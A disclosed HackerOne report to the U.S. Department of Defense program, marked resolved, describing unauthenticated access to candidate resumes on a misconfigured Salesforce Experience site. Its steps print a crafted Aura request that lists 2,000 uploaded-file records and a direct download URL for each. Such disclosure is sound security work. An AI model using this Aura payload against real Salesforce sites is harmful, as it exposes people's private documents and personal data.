---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-access-control-generic
  - env/web
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2024-12-18
submitted: 2024-07-25T07:46:39.889Z
bounty_usd: null
votes: 55
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "oxylis"
source: "https://hackerone.com/reports/2623715"
title: "Sensitive data exposure: █████████ candidate resumes/CVs available to download with no authentication through BAC/IDOR/Improper Salesforce config"
---
# Sensitive data exposure: █████████ candidate resumes/CVs available to download with no authentication through BAC/IDOR/Improper Salesforce config

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 55 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2024-12-18

- Report: [https://hackerone.com/reports/2623715](https://hackerone.com/reports/2623715)
- CWE: Improper Access Control - Generic
- Submitted: 2024-07-25T07:46:39.889Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Greetings DoD team,

I located a major example of sensitive data exposure through a BAC/incorrectly configured Salesforce instance.

The https://█████████.experience.███/s/registration page allows the attacker to download any attachment (including thousands of resumes full of PII, university transcripts, and other sensitive files) submitted by other users through the Registration form. Potentially this might also affect files added by the ███████ team manually.

At least several files are available (possibly many more); no authentication is required for this attack.

## Impact

Large-scale data breach/candidate PII leak.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Steps to reproduce:

1. In browser, navigate to: https://███████.experience.██████/s/registration
2. Within Burp, find any POST request to the /aura endpoint, such as below. Send to Repeater:

```
POST /s/sfsites/aura?r=1&aura.ApexAction.execute=1 HTTP/1.1
Host: ███████.experience.██████████
Cookie: ████████; BrowserId=ztAOY0pSEe-h9wmd5-lRkA; pctrk=ccfad8a9-dcf3-4ab7-9a5f-f623cdbcd7b7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://████.experience.███████/s/registration
X-Sfdc-Lds-Endpoints: ApexActionController.execute:RegistrationCtrl.getFileUploadRecord
X-Sfdc-Page-Scope-Id: 8f4f7425-7484-4329-b975-98c3bb386cfb
X-Sfdc-Request-Id: 326100000096dd5c96
X-Sfdc-Page-Cache: eec50ac11c34f2f4
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 1555
Origin: https://███.experience.████
Dnt: 1
Sec-Gpc: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2298%3Ba%22%2C%22descriptor%22%3A%22aura%3A%2F%2FApexActionController%2FACTION%24execute%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%22namespace%22%3A%22%22%2C%22classname%22%3A%22RegistrationCtrl%22%2C%22method%22%3A%22getFileUploadRecord%22%2C%22cacheable%22%3Afalse%2C%22isContinuation%22%3Afalse%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22WFIwUmVJdmtIRnI3MTFpX0d6c1VwQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%224aRXFMeJBEoyEhCBFKHHSA%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AinputField%22%3A%22MIteSSSIxKghQgDJWuI57g%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AoutputField%22%3A%224kDixPuHcKU99oJ3nGrYwA%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AfeedPublisher%22%3A%22eLdMCU5TIIj5fTlBFHu9Cg%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AforceCommunityFeed%22%3A%22T_JqvrMTIi87V9CzYeCoyQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AobjectHome%22%3A%22XokhHoGbTrHekjpxgyja7A%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArecordDetail%22%3A%22DhqIX7zfLrAKT30H1SrJBQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArelatedRecords%22%3A%22QKutWURpjg1wirSmIlNoOQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%221JitVv-ZC5qlK6HkuofJqQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2Fregistration&aura.token=null
```

3. Modify the request as follows. This is a specifically crafted Aura payload that returns 2000 ContentDocument records (uploaded files). Send to Repeater and issue request:

```
POST /s/sfsites/aura?r=1&aura.ApexAction.execute=1 HTTP/1.1
Host: ███████.experience.██████
Cookie: ██████; BrowserId=ztAOY0pSEe-h9wmd5-lRkA; pctrk=ccfad8a9-dcf3-4ab7-9a5f-f623cdbcd7b7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://██████.experience.███/s/registration
X-Sfdc-Lds-Endpoints: ApexActionController.execute:RegistrationCtrl.getFileUploadRecord
X-Sfdc-Page-Scope-Id: 8f4f7425-7484-4329-b975-98c3bb386cfb
X-Sfdc-Request-Id: 326100000096dd5c96
X-Sfdc-Page-Cache: eec50ac11c34f2f4
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 1554
Origin: https://██████.experience.██████████
Dnt: 1
Sec-Gpc: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"ContentDocument","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22WFIwUmVJdmtIRnI3MTFpX0d6c1VwQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%224aRXFMeJBEoyEhCBFKHHSA%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AinputField%22%3A%22MIteSSSIxKghQgDJWuI57g%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AoutputField%22%3A%224kDixPuHcKU99oJ3nGrYwA%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AfeedPublisher%22%3A%22eLdMCU5TIIj5fTlBFHu9Cg%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AforceCommunityFeed%22%3A%22T_JqvrMTIi87V9CzYeCoyQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AobjectHome%22%3A%22XokhHoGbTrHekjpxgyja7A%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArecordDetail%22%3A%22DhqIX7zfLrAKT30H1SrJBQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArelatedRecords%22%3A%22QKutWURpjg1wirSmIlNoOQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%221JitVv-ZC5qlK6HkuofJqQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2Fregistration&aura.token=null
```

4. Extract one of the IDs from the server response, e.g. 069830000028KJdAAM

██████████

5. Insert this ID into URL as below. This will download the attachment (confidential candidate resume) directly. All other files can be accessed using the same method.

https://██████████.experience.██████/sfsites/c/sfc/servlet.shepherd/document/download/069830000028KJdAAM

# Hope you find this report helpful - look forward to your feedback.

## Suggested Mitigation/Remediation Actions

## Timeline

- **Report Filed**
- **2024-07-25** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **2024-10-03** @oxylis: Awesome - thanks for the update! Glad it's fixed.
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
